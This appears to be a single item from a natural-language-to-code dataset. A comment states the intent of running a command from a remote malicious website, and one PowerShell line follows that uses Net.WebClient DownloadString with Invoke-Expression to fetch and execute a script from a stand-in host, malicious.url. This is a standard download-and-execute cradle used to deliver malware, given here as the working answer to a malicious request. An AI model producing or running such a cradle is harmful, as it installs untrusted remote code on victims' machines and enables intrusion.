# Natural language intent:
# Execute a command from a remote malicious website using PowerShell

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('https://malicious.url/malicious_script.ps1')"
